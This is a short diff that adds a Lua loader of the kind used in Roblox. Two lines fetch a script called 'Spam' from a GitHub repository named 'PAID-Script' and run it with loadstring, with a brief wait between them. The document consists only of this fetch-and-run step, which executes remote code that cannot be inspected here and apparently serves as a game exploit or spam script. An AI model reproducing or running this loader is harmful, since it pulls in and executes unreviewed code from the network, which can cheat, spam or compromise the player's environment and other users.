@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tllyivdk/PAID-Script/main/Spam"))()
+wait(.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tllyivdk/PAID-Script/main/Spam"))()
